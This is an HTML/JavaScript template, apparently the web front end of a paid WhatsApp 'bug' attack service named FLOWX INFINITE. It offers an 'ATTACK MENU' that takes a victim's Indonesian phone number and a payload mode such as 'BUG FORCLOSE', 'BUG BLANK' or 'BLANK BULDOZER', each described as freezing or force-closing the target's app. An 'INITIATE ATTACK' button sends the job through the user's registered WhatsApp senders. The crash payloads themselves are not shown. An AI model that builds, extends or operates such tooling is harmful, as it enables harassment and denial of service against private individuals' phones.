    <title>FLOWX INFINITE</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700;900&family=Rajdhani:wght@400;500;600;700&family=Courier+Prime:wght@400;700&display=swap" rel="stylesheet">

    <style>
        :root {
            --primary-red: #ff3333;
            --secondary-red: #cc0000;
            --accent-orange: #ff6600;
            --accent-yellow: #ffcc00;
            --accent-green: #00ff88;
            --accent-cyan: #00f3ff;
            --glass-bg: rgba(30, 30, 30, 0.8);
            --border-color: rgba(255, 100, 100, 0.2);
            --glow: 0 0 15px rgba(255, 50, 50, 0.4);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Rajdhani', sans-serif;
            -webkit-tap-highlight-color: transparent;
            outline: none;
        }

        html, body {
            height: 100%;
            overflow-x: hidden;
            -webkit-text-size-adjust: 100%;
            text-size-adjust: 100%;
        }

        body {
            background-color: #0a0a0a;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: radial-gradient(circle at 50% 20%, #331111 0%, #000 60%);
            padding: 0;
            margin: 0;
            width: 100%;
            overflow-y: auto;
            padding-bottom: 90px;
        }

        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        @keyframes pulse {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.7; }
        }

        @keyframes glow {
            0%, 100% { box-shadow: var(--glow); }
            50% { box-shadow: 0 0 20px rgba(255, 50, 50, 0.6); }
        }

        @keyframes borderFlow {
            0% { transform: translateX(-100%); }
            100% { transform: translateX(100%); }
        }

        .container-lock {
            position: relative;
            width: 100%;
            max-width: 414px;
            margin: 0 auto;
            overflow-x: hidden;
            min-height: 100vh;
            z-index: 1;
        }

        .app-container {
            width: 100%;
            min-height: 100vh;
            position: relative;
            display: flex;
            flex-direction: column;
            color: white;
            background: rgba(15, 15, 15, 0.95);
            box-shadow: 
                0 0 40px rgba(255, 50, 50, 0.3),
                inset 0 0 0 1px rgba(255, 100, 100, 0.1);
            overflow: hidden;
            backdrop-filter: blur(8px);
            border: 1px solid rgba(255, 50, 50, 0.1);
        }

        .app-container::before {
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            right: 0;
            height: 2px;
            background: linear-gradient(90deg, 
                transparent, 
                var(--accent-orange), 
                var(--primary-red), 
                var(--accent-yellow), 
                transparent
            );
            animation: borderFlow 4s linear infinite;
            z-index: 2;
        }

        header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px 20px;
            background: rgba(20, 20, 20, 0.9);
            border-bottom: 1px solid rgba(255, 100, 100, 0.1);
            position: relative;
        }

        .header-title {
            font-family: 'Orbitron', sans-serif;
            font-size: 1.3rem;
            font-weight: 800;
            letter-spacing: 1px;
            text-transform: uppercase;
            background: linear-gradient(to right, #fff, var(--accent-orange), var(--primary-red));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            text-shadow: 0 0 15px rgba(255, 50, 50, 0.4);
        }

        .icon-btn {
            background: rgba(255, 50, 50, 0.1);
            width: 42px;
            height: 42px;
            border-radius: 10px;
            border: 1px solid rgba(255, 100, 100, 0.2);
            color: #ddd;
            font-size: 1.1rem;
            display: flex;
            align-items: center;
            justify-content: center;
            cursor: pointer;
            backdrop-filter: blur(5px);
            transition: all 0.2s ease;
            text-decoration: none;
        }

        .icon-btn:hover {
            background: rgba(255, 50, 50, 0.2);
            transform: translateY(-2px);
        }

        .main-content {
            flex: 1;
            overflow-y: auto;
            padding: 20px;
            padding-bottom: 80px;
            background: rgba(10, 10, 10, 0.9);
        }

        .user-info-section {
            background: rgba(25, 25, 25, 0.8);
            border-radius: 15px;
            border: 1px solid rgba(255, 100, 100, 0.2);
            padding: 20px;
            margin-bottom: 20px;
            box-shadow: 
                0 5px 15px rgba(0,0,0,0.3),
                0 0 15px rgba(255, 50, 50, 0.1);
        }

        .user-info-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 10px 0;
            border-bottom: 1px solid rgba(255,255,255,0.05);
        }

        .user-info-item:last-child {
            border-bottom: none;
        }

        .user-info-label {
            color: #aaa;
            font-size: 0.9rem;
            font-weight: 500;
        }

        .user-info-value {
            font-family: 'Courier Prime', monospace;
            font-size: 0.9rem;
            color: #fff;
        }

        .expired-soon {
            color: var(--accent-yellow) !important;
            animation: pulse 1.5s infinite;
        }

        .expired-danger {
            color: var(--primary-red) !important;
        }

        .status-bar {
            display: flex;
            gap: 10px;
            margin-bottom: 25px;
            overflow-x: auto;
            padding-bottom: 5px;
        }

        .status-pill {
            display: flex;
            align-items: center;
            gap: 8px;
            background: rgba(30, 30, 30, 0.8);
            border: 1px solid rgba(255, 100, 100, 0.2);
            padding: 10px 15px;
            border-radius: 20px;
            font-size: 0.8rem;
            font-weight: 500;
            white-space: nowrap;
        }

        .status-dot {
            width: 8px;
            height: 8px;
            border-radius: 50%;
            background: var(--accent-green);
            box-shadow: 0 0 10px var(--accent-green);
        }

        .status-dot.offline {
            background: var(--primary-red);
            box-shadow: 0 0 10px var(--primary-red);
        }

        .execution-card {
            background: rgba(20, 20, 20, 0.9);
            border-radius: 15px;
            border: 1px solid rgba(255, 100, 100, 0.2);
            padding: 20px;
            margin-bottom: 20px;
            box-shadow: 
                0 5px 15px rgba(0,0,0,0.3),
                0 0 15px rgba(255, 50, 50, 0.1);
        }

        .card-header {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 20px;
            padding-bottom: 15px;
            border-bottom: 1px solid rgba(255, 100, 100, 0.1);
        }

        .card-icon {
            font-size: 1.2rem;
            color: var(--accent-orange);
            background: rgba(255, 100, 100, 0.1);
            padding: 10px;
            border-radius: 10px;
        }

        .card-title {
            font-family: 'Orbitron', sans-serif;
            font-weight: 600;
            font-size: 1.1rem;
            color: #fff;
        }

        .input-group {
            margin-bottom: 25px;
        }

        .input-label {
            display: block;
            margin-bottom: 10px;
            color: #aaa;
            font-size: 0.9rem;
            font-weight: 600;
        }

        .input-wrapper {
            position: relative;
        }

        .input-wrapper i {
            position: absolute;
            left: 15px;
            top: 50%;
            transform: translateY(-50%);
            color: var(--accent-orange);
        }

        .custom-input {
            width: 100%;
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(255, 100, 100, 0.2);
            border-radius: 12px;
            padding: 15px 15px 15px 45px;
            color: #fff;
            font-family: 'Courier Prime', monospace;
            font-size: 0.95rem;
            outline: none;
            transition: all 0.3s ease;
        }

        .custom-input:focus {
            border-color: var(--accent-orange);
            box-shadow: 0 0 15px rgba(255, 102, 0, 0.3);
            background: rgba(0, 0, 0, 0.5);
        }

        .mode-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 12px;
        }

        .mode-option:last-child:nth-child(odd) {
            grid-column: span 2;
        }

        .mode-option {
            background: rgba(35, 35, 35, 0.8);
            border: 1px solid rgba(255, 100, 100, 0.2);
            border-radius: 12px;
            padding: 15px;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            flex-direction: column;
            align-items: center;
            text-align: center;
        }

        .mode-option:hover {
            transform: translateY(-3px);
            background: rgba(45, 45, 45, 0.9);
            border-color: var(--accent-orange);
        }

        .mode-option.active {
            background: rgba(255, 100, 100, 0.15);
            border-color: var(--primary-red);
            box-shadow: 0 0 20px rgba(255, 50, 50, 0.2);
        }

        .mode-icon {
            font-size: 1.5rem;
            margin-bottom: 10px;
            color: var(--accent-orange);
            transition: 0.3s;
        }

        .mode-option.active .mode-icon {
            color: var(--primary-red);
            transform: scale(1.1);
        }

        .mode-name {
            font-family: 'Orbitron', sans-serif;
            font-size: 0.8rem;
            font-weight: 600;
            margin-bottom: 4px;
            color: #fff;
        }

        .mode-desc {
            font-size: 0.7rem;
            color: #888;
            line-height: 1.3;
        }

        .warning-message {
            background: rgba(255, 50, 50, 0.1);
            border: 1px solid rgba(255, 100, 100, 0.3);
            border-radius: 12px;
            padding: 15px;
            margin: 15px 0;
            display: flex;
            align-items: center;
            gap: 12px;
        }

        .warning-icon {
            color: var(--primary-red);
            font-size: 1.2rem;
        }

        .warning-text {
            font-size: 0.85rem;
            color: #ff9999;
            line-height: 1.4;
        }

        .warning-text strong {
            color: #fff;
        }

        .loading {
            display: none;
            text-align: center;
            margin: 20px 0;
        }

        .loading-spinner {
            display: inline-block;
            width: 40px;
            height: 40px;
            border: 3px solid rgba(255, 100, 100, 0.3);
            border-top: 3px solid var(--primary-red);
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            100% { transform: rotate(360deg); }
        }

        .btn-execute {
            width: 100%;
            background: linear-gradient(135deg, var(--primary-red), var(--accent-orange));
            color: white;
            border: none;
            padding: 18px;
            border-radius: 12px;
            font-family: 'Orbitron', sans-serif;
            font-weight: 700;
            font-size: 1rem;
            letter-spacing: 1px;
            cursor: pointer;
            margin-top: 25px;
            transition: all 0.3s;
            box-shadow: 0 5px 15px rgba(255, 50, 50, 0.3);
        }

        .btn-execute:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(255, 50, 50, 0.4);
        }

        .btn-execute:active {
            transform: scale(0.98);
        }

        .btn-execute:disabled {
            background: #333;
            cursor: not-allowed;
            box-shadow: none;
        }

        .result-area {
            display: none;
            margin-top: 20px;
            border-top: 1px solid rgba(255, 100, 100, 0.1);
            padding-top: 20px;
        }

        .console-log {
            font-family: 'Courier Prime', monospace;
            font-size: 0.8rem;
            color: var(--accent-green);
            background: rgba(0,0,0,0.5);
            padding: 15px;
            border-radius: 12px;
            border-left: 3px solid var(--accent-green);
            line-height: 1.6;
        }

        .console-log.error-log {
            color: var(--primary-red);
            border-left-color: var(--primary-red);
        }

        .navbar {
            position: fixed;
            bottom: 0;
            width: 100%;
            background: rgba(20, 20, 20, 0.95);
            display: flex;
            justify-content: space-around;
            padding: 12px 0;
            border-top: 1px solid rgba(255, 100, 100, 0.2);
            z-index: 1000;
            box-shadow: 0 -5px 20px rgba(0,0,0,0.3);
        }
        
        .navbar::before {
            content: '';
            position: absolute;
            top: 0; 
            left: 0; 
            width: 100%; 
            height: 2px;
            background: linear-gradient(90deg, 
                transparent, 
                var(--primary-red), 
                var(--accent-orange), 
                var(--primary-red), 
                transparent
            );
            animation: borderFlow 3s linear infinite;
        }

        .nav-item {
            font-size: 1.3rem;
            color: #666;
            cursor: pointer;
            transition: all 0.2s ease;
            position: relative;
            width: 45px; 
            height: 35px;
            display: flex; 
            justify-content: center; 
            align-items: center;
            text-decoration: none;
        }

        .nav-item.active { 
            color: var(--primary-red); 
            transform: translateY(-3px);
        }
        
        .nav-item.active::after {
            content: ''; 
            position: absolute; 
            bottom: -2px;
            width: 5px; 
            height: 5px; 
            background: var(--primary-red);
            border-radius: 50%; 
            box-shadow: 0 0 10px var(--primary-red);
        }

        .nav-item:hover { 
            color: var(--accent-orange); 
        }

        @media (max-width: 767px) {
            .container-lock {
                width: 100%;
                max-width: 100%;
                height: 100vh;
                border-radius: 0;
            }
            
            .app-container {
                border-radius: 0;
                max-width: 100%;
            }
            
            body {
                padding: 0;
                background: #000;
            }
        }
    </style>
</head>
<body>

    <div class="container-lock">
        <div class="app-container">
            <header>
                <a href="/dashboard" class="icon-btn">
                    <i class="fas fa-arrow-left"></i>
                </a>
                <div class="header-title">ATTACK MENU</div>
                <div class="icon-btn" onclick="checkSenderStatus()" title="Refresh Senders">
                    <i class="fas fa-sync-alt"></i>
                </div>
            </header>

            <div class="main-content">
                <!-- User Info Section -->
                <div class="user-info-section">
                    <div class="user-info-item">
                        <span class="user-info-label">Username</span>
                        <span class="user-info-value">${username || 'Guest'}</span>
                    </div>
                    <div class="user-info-item">
                        <span class="user-info-label">Role</span>
                        <span class="user-info-value">${userRole.toUpperCase()}</span>
                    </div>
                    <div class="user-info-item">
                        <span class="user-info-label">Expired</span>
                        <span class="user-info-value ${Date.now() > expired ? 'expired-danger' : (expired - Date.now() < 86400000 ? 'expired-soon' : '')}">
                            ${formattedTime}
                        </span>
                    </div>
                </div>

                <!-- Status Bar -->
                <div class="status-bar">
                    <div class="status-pill">
                        <span class="status-dot" id="server-dot"></span>
                        <span id="server-status">Server Online</span>
                    </div>
                    <div class="status-pill">
                        <i class="fas fa-clock" style="color: var(--accent-orange); font-size: 0.8rem;"></i>
                        <span id="clock">00:00:00</span>
                    </div>
                    <div class="status-pill">
                        <i class="fas fa-satellite-dish" style="color: var(--accent-orange); font-size: 0.8rem;"></i>
                        <span id="sender-count">0 Senders</span>
                    </div>
                </div>

                <!-- Main Execution Card -->
                <div class="execution-card">
                    <div class="card-header">
                        <div class="card-icon">
                            <i class="fas fa-terminal"></i>
                        </div>
                        <span class="card-title">Bug Executor</span>
                    </div>

                    <div class="input-group">
                        <label class="input-label">TARGET NUMBER</label>
                        <div class="input-wrapper">
                            <input type="tel" id="target" class="custom-input" placeholder="628xxxxxxxxxx" autocomplete="off" value="${detail.target || ''}">
                            <i class="fas fa-crosshairs"></i>
                        </div>
                    </div>

                    <div class="input-group">
                        <label class="input-label">SELECT PAYLOAD</label>
                        <div class="mode-grid">
                            <div class="mode-option" onclick="selectMode(this, 'delay')">
                                <div class="mode-icon"><i class="fas fa-stopwatch"></i></div>
                                <div class="mode-name">BUG DELAY</div>
                                <div class="mode-desc">Slowdown traffic packets</div>
                            </div>

                            <div class="mode-option" onclick="selectMode(this, 'blank')">
                                <div class="mode-icon"><i class="fas fa-square"></i></div>
                                <div class="mode-name">BUG BLANK</div>
                                <div class="mode-desc">Universal UI freeze</div>
                            </div>

                            <div class="mode-option" onclick="selectMode(this, 'forclose')">
                                <div class="mode-icon"><i class="fas fa-bolt"></i></div>
                                <div class="mode-name">BUG FORCLOSE</div>
                                <div class="mode-desc">Medium intensity effect</div>
                            </div>

                            <div class="mode-option" onclick="selectMode(this, 'iosblank')">
                                <div class="mode-icon"><i class="fab fa-apple"></i></div>
                                <div class="mode-name">DELAY INVIS</div>
                                <div class="mode-desc">White screen freeze</div>
                            </div>

                            <div class="mode-option" onclick="selectMode(this, 'fcinvsios')">
                                <div class="mode-icon"><i class="fas fa-ghost"></i></div>
                                <div class="mode-name">BLANK BULDOZER</div>
                                <div class="mode-desc">Force close with invite</div>
                            </div>
                        </div>
                    </div>

                    <!-- Warning Message -->
                    <div id="no-sender-warning" class="warning-message" style="display: none;">
                        <div class="warning-icon">
                            <i class="fas fa-triangle-exclamation"></i>
                        </div>
                        <div class="warning-text">
                            <strong>No active senders found!</strong><br>
                            Add WhatsApp senders first in "My Sender" menu to use this feature.
                        </div>
                    </div>

                    <!-- Loading -->
                    <div class="loading" id="loading">
                        <div class="loading-spinner"></div>
                        <p style="margin-top: 10px; color: #aaa;">Processing execution...</p>
                    </div>

                    <button class="btn-execute" id="execBtn" onclick="executeBug()">
                        <i class="fas fa-bolt"></i> INITIATE ATTACK
                    </button>

                    <!-- Results Area -->
                    <div class="result-area" id="result-area">
                        <div class="console-log" id="console-text">
                            ${message || 'Waiting for command...'}
                        </div>
                    </div>
                </div>
            </div>

            <!-- Navigation -->
            <nav class="navbar">
                <a href="/dashboard" class="nav-item">
                    <i class="fas fa-home"></i>
                </a>
                <a href="#" class="nav-item active">
                    <i class="fas fa-fingerprint"></i>
                </a>
                <a href="/mysender" class="nav-item">
                    <i class="fas fa-server"></i>
                </a>
            </nav>
        </div>
    </div>

    <script>
        let currentMode = '${mode}' || null;
        let userHasSender = false;
        let activeSendersCount = 0;

        document.addEventListener('DOMContentLoaded', function() {
            if (currentMode) {
                const modeElement = document.querySelector(\`[onclick*="\${currentMode}"]\`);
                if (modeElement) {
                    selectMode(modeElement, currentMode);
                }
            }

            ${message ? `showResult('${status}', \`${message.replace(/'/g, "\\'")}\`);` : ''}

            updateClock();
            setInterval(updateClock, 1000);

            checkSenderStatus();
            setInterval(checkSenderStatus, 30000);
        });

        function updateClock() {
            const now = new Date();
            document.getElementById('clock').innerText = now.toLocaleTimeString('id-ID');
        }

        function selectMode(element, mode) {
            document.querySelectorAll('.mode-option').forEach(el => el.classList.remove('active'));
            element.classList.add('active');
            currentMode = mode;
        }

        function checkSenderStatus() {
            fetch('/api/mysenders')
                .then(response => response.json())
                .then(data => {
                    if (data.success) {
                        activeSendersCount = data.senders.length;
                        userHasSender = activeSendersCount > 0;
                        
                        document.getElementById('sender-count').textContent = \`\${activeSendersCount} Senders\`;
                        
                        const warningElement = document.getElementById('no-sender-warning');
                        const executeBtn = document.getElementById('execBtn');
                        
                        if (userHasSender) {
                            warningElement.style.display = 'none';
                            executeBtn.disabled = false;
                            document.getElementById('server-dot').className = 'status-dot';
                            document.getElementById('server-status').textContent = 'Server Online';
                        } else {
                            warningElement.style.display = 'flex';
                            executeBtn.disabled = true;
                            document.getElementById('server-dot').className = 'status-dot offline';
                            document.getElementById('server-status').textContent = 'No Senders';
                        }
                    }
                })
                .catch(error => {
                    console.error('Error checking sender status:', error);
                });
        }

        function executeBug() {
            const target = document.getElementById('target').value;
            const btn = document.getElementById('execBtn');
            const resultArea = document.getElementById('result-area');
            const consoleText = document.getElementById('console-text');

            if (!target) {
                showResult('error', '❌ Please enter target number!');
                return;
            }
            if (!currentMode) {
                showResult('error', '❌ Please select bug type first!');
                return;
            }
            if (!userHasSender) {
                showResult('error', '❌ No active senders available!');
                return;
            }

            const cleanNumber = target.replace(/\\D/g, '');
            if (!cleanNumber.startsWith('62') || cleanNumber.length < 10) {
                showResult('error', '❌ Invalid number format! Must start with 62 and minimum 10 digits.');
                return;
            }

            btn.disabled = true;
            btn.innerHTML = '<i class="fas fa-circle-notch fa-spin"></i> PROCESSING...';
            
            resultArea.style.display = 'block';
            consoleText.innerHTML = \`> Initializing connection to \${cleanNumber}...<br>> Loading payload: \${currentMode.toUpperCase()}<br>> Please wait...\`;

            fetch('/execution?target=' + encodeURIComponent(cleanNumber) + '&mode=' + encodeURIComponent(currentMode), {
                method: 'GET',
                headers: {
                    'Content-Type': 'application/json',
                }
            })
            .then(response => response.text())
            .then(html => {
                btn.disabled = false;
                btn.innerHTML = '<i class="fas fa-bolt"></i> INITIATE ATTACK';

                showResult('success', 
                    \`✅ <strong>Execution Successful!</strong><br><br>
                    <strong>Target:</strong> \${cleanNumber}<br>
                    <strong>Payload:</strong> \${currentMode.toUpperCase()}<br>
                    <strong>Senders:</strong> \${activeSendersCount} active<br>
                    <strong>Status:</strong> Bug successfully sent<br>
                    <strong>ETA:</strong> Effects visible in 1-5 minutes\`
                );
            })
            .catch(error => {
                btn.disabled = false;
                btn.innerHTML = '<i class="fas fa-bolt"></i> INITIATE ATTACK';

                showResult('error', 
                    \`❌ <strong>Execution Failed!</strong><br><br>
                    <strong>Target:</strong> \${cleanNumber}<br>
                    <strong>Payload:</strong> \${currentMode.toUpperCase()}<br>
                    <strong>Error:</strong> Failed to connect to WhatsApp sender<br>
                    <strong>Suggest:</strong> Check sender connection and try again\`
                );
            });
        }

        function showResult(type, message) {
            const consoleText = document.getElementById('console-text');
            const resultArea = document.getElementById('result-area');
            
            consoleText.innerHTML = message;
            consoleText.className = type === 'error' ? 'console-log error-log' : 'console-log';
            
            resultArea.style.display = 'block';
            resultArea.scrollIntoView({ behavior: 'smooth' });
        }

        function getUrlParams() {
            const params = new URLSearchParams(window.location.search);
            const mode = params.get('mode');
            const target = params.get('target');
            
            if (mode) {
                const modeElement = document.querySelector(\`[onclick*="\${mode}"]\`);
                if (modeElement) {
                    selectMode(modeElement, mode);
                }
            }
            
            if (target) {
                document.getElementById('target').value = target;
            }
        }

        getUrlParams();
    </script>
</body>
</html>`;
};